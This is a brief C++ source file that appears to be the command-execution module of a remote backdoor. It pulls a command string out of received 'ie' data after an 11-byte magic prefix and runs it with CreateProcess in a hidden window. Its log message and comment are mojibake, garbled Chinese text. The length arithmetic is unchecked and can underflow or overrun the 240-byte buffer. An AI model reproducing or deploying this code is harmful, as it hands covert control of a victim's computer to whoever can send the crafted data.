#include "Action_ExcuteCmd.h"

void Action_ExcuteCmd::ExcuteAction(ie_data *ie, char *magic) {
	char command[240] = { 0 };
	strncpy_s(command, magic + 11, ie->len - 11);
	HLOG("÷¥––µƒ√¸¡Ó£∫%s\n", command);//÷¥––√¸¡Ó

	STARTUPINFO  si;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof STARTUPINFO;
	PROCESS_INFORMATION  pi;
	BOOL  res = CreateProcess(NULL, command, NULL, NULL, NULL, NORMAL_PRIORITY_CLASS | CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
	
	if (TRUE == res)
	{
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}
}